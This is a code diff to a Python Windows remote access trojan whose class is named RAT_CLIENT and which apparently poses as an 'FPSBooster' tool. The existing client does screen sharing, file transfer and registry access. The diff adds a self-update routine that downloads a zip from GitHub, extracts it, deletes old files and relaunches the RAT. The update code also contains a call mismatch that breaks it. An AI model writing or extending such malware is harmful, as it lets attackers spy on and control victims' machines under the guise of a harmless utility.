@@ -18,6 +18,9 @@ import time
 import winreg as reg
 from modules.screenshare import ScreenShare
 from modules.filetransfer import FileTransfer
+import requests
+import sys
+import zipfile
 
 user32 = ctypes.WinDLL('user32')
 kernel32 = ctypes.WinDLL('kernel32')
@@ -79,6 +82,7 @@ class RAT_CLIENT:
             target=self.file_transfer_manager.connect
         )
         self.file_transfer_thread.start()
+        # Compare this version and a the version on github.
 
     def build_connection(self):
         global s
@@ -145,6 +149,43 @@ class RAT_CLIENT:
             # Terminate the process
             self.screen_share_process.terminate()
             return "Screen share stopped successfully"
+
+    def check_version(self):
+        self.github_version = requests.get(
+            "https://raw.githubusercontent.com/lukasolsen/FPSBooster/main/ver.txt"
+        ).text.strip()
+        # The text file should just look like this: 1.0.0
+        # Open up our own version file and read the version
+        with open("ver.txt", "r") as f:
+            current_version = f.read().strip()
+
+        if self.github_version != current_version:
+            # The versions are different, so we need to update
+            # Download the new version
+            self.download_new_version(self.github_version)
+    def download_new_version(self):
+        # Download the new version
+        response = requests.get("https://github.com/lukasolsen/FPSBooster/archive/main.zip")
+        # Write the zip file to disk
+        with open("new_version.zip", "wb") as f:
+            f.write(response.content)
+        # Extract the zip file
+        with zipfile.ZipFile("new_version.zip", "r") as zip_ref:
+            zip_ref.extractall()
+        # Delete the zip file
+        os.remove("new_version.zip")
+        # Delete the old version
+        os.remove("ver.txt")
+        # Rename the new version
+        os.rename("FPSBooster-main", "FPSBooster")
+        # Write the new version to a file
+        with open("ver.txt", "w") as f:
+            f.write(self.github_version)
+        # Restart the RAT
+        subprocess.Popen(["python", "main.pyw"])
+        # Exit the current RAT
+        sys.exit(0)
+
 
 
 if __name__ == '__main__':
